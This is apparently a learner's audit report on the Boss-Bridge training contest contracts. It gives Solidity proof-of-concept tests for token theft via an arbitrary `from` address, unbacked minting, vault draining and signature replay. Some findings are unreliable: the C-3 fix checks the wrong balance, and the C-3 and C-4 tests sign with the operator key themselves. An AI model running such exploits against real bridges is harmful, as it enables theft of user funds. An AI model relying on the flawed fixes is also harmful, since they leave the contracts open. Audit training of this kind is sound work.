![](logo.png)
![](./img/boss-bridge.png)

# Security Report for the Boss-Bridge CodeHawks FirstFlight Contest **learning*

**Source:** https://github.com/Cyfrin/2023-11-Boss-Bridge/

## Critical Issues

### [C-1] Giving token approval to `L1BossBridge` could lead to theft of assets by malicious entity

**Description:**

Anyone (including a malicious entity) can call the `L1BossBridge::depositTokensToL2()` function with a `from` address of any account that has already approved tokens to the bridge.

**Impact:**
An attacker can move tokens out of any victim account whose token allowance to the bridge is greater than zero. This will move the tokens into the bridge vault, but they will be assigned to the attacker's address in L2 (because an attacker-controlled address was set in the `l2Recipient` parameter)

**Proof of Concept:**

Add the following test to the `L1TokenBridge.t.sol` file:

```solidity
    function testCanStealApprovedTokensOfAnotherUser() public {
        // unsuspecting user approves
        vm.prank(user);
        token.approve(address(tokenBridge), type(uint256).max);

        uint256 depositAmount = token.balanceOf(user);

        address thief = makeAddr("thief");
        vm.startPrank(thief);
        vm.expectEmit(address(tokenBridge));
        emit Deposit(user, thief, depositAmount);
        tokenBridge.depositTokensToL2({
            from: user,
            l2Recipient: thief,
            amount: depositAmount
        });

        assertEq(token.balanceOf(user), 0);
        assertEq(token.balanceOf(address(vault)), depositAmount);

        // thief can even withdraw stolen tokens
        (uint8 v, bytes32 r, bytes32 s) = _signMessage(
            _getTokenWithdrawalMessage(thief, depositAmount),
            operator.key
        );
        tokenBridge.withdrawTokensToL1(thief, depositAmount, v, r, s);
        assertEq(token.balanceOf(thief), depositAmount);
        vm.stopPrank();
    }
```

**Recommended Mitigation:**

Consider modifying the `depositTokensToL2()` function such that the `msg.sender`/caller of the function is automatically the `from` address:

```diff
-   function depositTokensToL2(address from, address l2Recipient, uint256 amount) external whenNotPaused
+   function depositTokensToL2(address l2Recipient, uint256 amount) external whenNotPaused {
        if (token.balanceOf(address(vault)) + amount > DEPOSIT_LIMIT) {
            revert L1BossBridge__DepositLimitReached();
        }
-       token.safeTransferFrom(from, address(vault), amount);
+       token.safeTransferFrom(msg.sender, address(vault), amount);

        // Our off-chain service picks up this event and mints the corresponding tokens on L2
-       emit Deposit(from, l2Recipient, amount);
+       emit Deposit(msg.sender, l2Recipient, amount);
    }
```

### [C-2] Calling `L1BossBridge::depositTokensToL2()` function from the vault contract to the vault contract allows infinite minting of unbacked tokens

**Description:**

`depositTokensToL2()` function allows the caller to specify the `from` address, from which tokens are taken.

**Impact:**

Because the vault grants infinite approval to the bridge already (as can be seen in the contract's constructor), it is possible for an attacker to call the `depositTokensToL2()` and transfer tokens from the vault to the vault itself. This would allow the attacker to trigger the `Deposit()` event any number of times, presumably causing the minting of unbacked tokens in L2.    
Additionally, they could mint all the tokens to themselves.

**Proof of Concept:**

Add the following test to the `L1TokenBridge.t.sol` file:

```solidity
    function testCanTransferFromVaultToVault() public {
        address thief = makeAddr("thief");
        uint256 vaultBalance = 200e18;
        deal(address(token), address(vault), vaultBalance);

        // self transfer tokens to the vault and trigger event
        vm.expectEmit(address(tokenBridge));
        emit Deposit(address(vault), thief, vaultBalance);
        tokenBridge.depositTokensToL2({
            from: address(vault),
            l2Recipient: thief,
            amount: vaultBalance
        });

        // thief can continue self-minting themselves token on the L2 unlimited
        vm.expectEmit(address(tokenBridge));
        emit Deposit(address(vault), thief, vaultBalance);
        tokenBridge.depositTokensToL2({
            from: address(vault),
            l2Recipient: thief,
            amount: vaultBalance
        });
        vm.expectEmit(address(tokenBridge));
        emit Deposit(address(vault), thief, vaultBalance);
        tokenBridge.depositTokensToL2({
            from: address(vault),
            l2Recipient: thief,
            amount: vaultBalance
        });
        vm.expectEmit(address(tokenBridge));
        emit Deposit(address(vault), thief, vaultBalance);
        tokenBridge.depositTokensToL2({
            from: address(vault),
            l2Recipient: thief,
            amount: vaultBalance
        });
        // till infinity
    }
```

**Recommended Mitigation:**

As suggested in `[C-1]`, consider modifying the `depositTokensToL2()` function so that the caller cannot specify a `from` address.

### [C-3] Attacker can withdraw more funds than they initially deposited into the protocol due to no check for that sort of thing

**Description:**

The `L1BossBridge::withdrawTokensToL1()` function lacks no check to ensure that the `amount` to be withdrawn is indeed the `amount` that was deposited in the `L1BossBridge::depositTokensToL2()` function.

**Impact:**

An attacker can withdraw more than they deposited. And if they are ware of the tvl of the protocol, they can drain the funds of the protocol in one transaction.

**Proof Concept:**

Add the following test to the `LiTokenBridge.t.sol` file:

```solidity
    function testCanWithdrawMoreThanDeposited() public {
        address attacker = makeAddr("attacker");
        address tokenAddr = address(token);
        address vaultAddr = address(vault);
        uint256 attackerDeposit = 10e18;
        uint256 userDeposit = token.balanceOf(user);

        // user txns
        vm.startPrank(user);
        token.approve(address(tokenBridge), type(uint256).max);
        tokenBridge.depositTokensToL2({ from: user, l2Recipient: user, amount: userDeposit });

        assert(token.balanceOf(vaultAddr) == userDeposit);
        assert(token.balanceOf(user) == 0);

        // attacker txns
        deal(tokenAddr, attacker, attackerDeposit);
        vm.startPrank(attacker);
        token.approve(address(tokenBridge), type(uint256).max);
        tokenBridge.depositTokensToL2({ from: attacker, l2Recipient: attacker, amount: attackerDeposit });

        assert(token.balanceOf(attacker) == 0);
        assert(token.balanceOf(vaultAddr) == (userDeposit + attackerDeposit));

        uint256 tvl = token.balanceOf(vaultAddr);

        // attacker attempts to withdraw more than deposited, and is successful
        (uint8 v, bytes32 r, bytes32 s) =
            _signMessage(_getTokenWithdrawalMessage(attacker, tvl), operator.key);
        tokenBridge.withdrawTokensToL1(attacker, tvl, v, r, s);

        assert(token.balanceOf(vaultAddr) == 0);
        assert(token.balanceOf(attacker) == tvl);
    }
```

**Recommended Mitigation:**

Add a check (as well as a custom error) that prevents withdrawals more than deposited amount.

```diff
    error L1BossBridge__DepositLimitReached();
    error L1BossBridge__Unauthorized();
    error L1BossBridge__CallFailed();
+   error L1BossBridge__CantWithdrawMoreThanDeposit();
.
.
.
    function withdrawTokensToL1(address to, uint256 amount, uint8 v, bytes32 r, bytes32 s) external {
+       if (amount > token.balanceOf(msg.sender)) {
+           revert L1BossBridge__CantWithdrawMoreThanDeposit();
+       }
        sendToL1(
            v,
            r,
            s,
            abi.encode(
                address(token),
                0, // value
                abi.encodeCall(IERC20.transferFrom, (address(vault), to, amount))
            )
        );
    }
```

### [C-4] Can withdraw total tvl of protocol without ever needing to deposit any penny 😂😂😂

I seriously don't know what to say 😂😂😂.. Anyway, here is a test to prove this finding, and use the mitigation in [C-3] to mitigate this

```solidity
    function testCanWithdrawWithoutDeposit() public {
        address thief = makeAddr("thief");
        uint256 tvl = 5000e18;
        deal(address(token), address(vault), tvl);

        assert(token.balanceOf(address(vault)) == tvl);

        // thief attempts to withdraw without depositing
        vm.startPrank(thief);
        (uint8 v, bytes32 r, bytes32 s) = _signMessage(_getTokenWithdrawalMessage(thief, tvl), operator.key);
        tokenBridge.withdrawTokensToL1(thief, tvl, v, r, s);

        assert(token.balanceOf(thief) == tvl);
        assert(token.balanceOf(address(vault)) == 0);
    }
```



## High Issues

### [H-1] `TokenFactory::deployToken()` function will not work on `zkSync ERC` because `CREATE` opcode does not work on `zkSync ERC` as per their docs. Tokens will be locked forever

### [H-2] Lack of replay protection in `L1BossBridge::withdrawTokensToL1()` allows withdrawals by signature to be replayed

**Description:**

Users who want to withdraw tokens can either call either of the `L1BossBridge::sendToL1()` or `withdrawTokensToL1()` functions. These functions require the caller to send along some withdrawal data signed by one of the approved by one of the approved bridge operators.    
These signatures however lack any form of replay-protection mechanism, and because they are visible on-chain. they are vulnerable to replay attacks.

**Impact:**

Valid signatures from any bridge operator can be reused by any attacker to continue executing withdrawals until the vault is completely drained.

**Proof of Concept:**

Add the following test to the `L1TokenBridge.t.sol` file:

```solidity
function testSignatureReplayAttack() public {
        address vaultAddr = address(vault);
        address tokenAddr = address(token);
        // assume the vault already holds tokens
        uint256 vaultStartingBalance = 1000e18;
        deal(tokenAddr, vaultAddr, vaultStartingBalance);

        address thief = makeAddr("thief");
        uint256 thiefStartingBalance = 100e18;
        deal(tokenAddr, thief, thiefStartingBalance);

        // thief deposits tokens to L2
        vm.startPrank(thief);
        token.approve(address(tokenBridge), type(uint256).max);
        tokenBridge.depositTokensToL2({
            from: thief,
            l2Recipient: thief,
            amount: thiefStartingBalance
        });

        (uint8 v, bytes32 r, bytes32 s) = _signMessage(
            _getTokenWithdrawalMessage(thief, thiefStartingBalance),
            operator.key
        );

        // because signature is on-chain, thief can use it to continue withdrawals, and protocol will approve because it
        // is valid
        while (token.balanceOf(vaultAddr) > 0) {
            tokenBridge.withdrawTokensToL1({
                to: thief,
                amount: thiefStartingBalance,
                v: v,
                r: r,
                s: s
            });
        }

        assertEq(
            token.balanceOf(thief),
            thiefStartingBalance + vaultStartingBalance
        );
    }
```

**Recommended Mitigation:**

Consider modifying the withdrawal mechanism to include some form of replay protection. This could be a `nonce`, `deadline`, etc.

### [H-3] Possible DOS attack in `L1BossBridge::depositTokensToL2()` function due to `DEPOSIT_LIMIT` check

**Description:**

There is a check in the `depositTokensToL2()` function to ensure that sum of tokens currently in the `vault` plus whatever `amount` the user wants to deposit is not greater than the `DEPOSIT_LIMIT` of the protocol. If it is, the `depositTokensToL2()` will revert with a custom error.

An attacker could bring the protocol to a possible grind if they are aware of the **token balance of the vault**.

**Impact:**

While there is no monetary gain for the attacker, this is a DOS attack on the protocol. Any subsequent deposit will be reverted because the `DEPOSIT_LIMIT` has already been reached.

**Proof of Concept:**

1. An attacker gets aware of the balance of tokens in the vault.
2. They calculate how much they will need to deposit (this could be a very big amount...depending on the `DEPOSIT_LIMIT` and vault balance) to make the vault balance match up to exactly the `DEPOSIT_LIMIT`.
3. Any other user who wants to deposit will be unable to do because the `depositTokensToL2()` will keep on reverting.

Plcae the following test into `L1TokenBridge.t.sol` file:

```solidity
    function testCanDosProtocolWithDeposit() public {
        address attacker = makeAddr("attacker");
        address randomUser = makeAddr("randomUser");
        address vaultAddr = address(vault);
        address tokenAddr = address(token);
        uint256 userDepositAmount = token.balanceOf(user);

        // user deposits to L2
        vm.startPrank(user);
        token.approve(address(tokenBridge), type(uint256).max);
        tokenBridge.depositTokensToL2({
            from: user,
            l2Recipient: user,
            amount: userDepositAmount
        });

        assert(token.balanceOf(vaultAddr) == userDepositAmount);
        assert(token.balanceOf(user) == 0);

        uint256 amountToDos = tokenBridge.DEPOSIT_LIMIT() - token.balanceOf(vaultAddr);

        // attacker txns
        deal(tokenAddr, attacker, amountToDos);
        vm.startPrank(attacker);
        token.approve(address(tokenBridge), type(uint256).max);
        tokenBridge.depositTokensToL2({
            from: attacker,
            l2Recipient: attacker,
            amount: amountToDos
        });

        assert(token.balanceOf(vaultAddr) == tokenBridge.DEPOSIT_LIMIT());
        assert(token.balanceOf(attacker) == 0);

        // random user txns
        deal(tokenAddr, randomUser, 1e18);
        vm.startPrank(randomUser);
        token.approve(address(tokenBridge), type(uint256).max);
        
        // transaction will revert because `DEPOSIT_LIMIT` has already been reached. Nobody is able to deposit tokens, thus service is denied
        vm.expectRevert(L1BossBridge.L1BossBridge__DepositLimitReached.selector);
        tokenBridge.depositTokensToL2({
            from: randomUser,
            l2Recipient: randomUser,
            amount: 1e18
        });

        assert(token.balanceOf(randomUser) == 1e18);
        assert(token.balanceOf(vaultAddr) == tokenBridge.DEPOSIT_LIMIT());
    }
```

**Recommended Mitigation:**

There is no sure mitigation for this. But, perhaps the `DEPOSIT_LIMIT` can be made so high (probably `type(uint256).max`). Because there is no monetary gain for this kind of attack, whoever performs this attack must really hate `BossBridge`. Perhaps you should make up with your enemies.




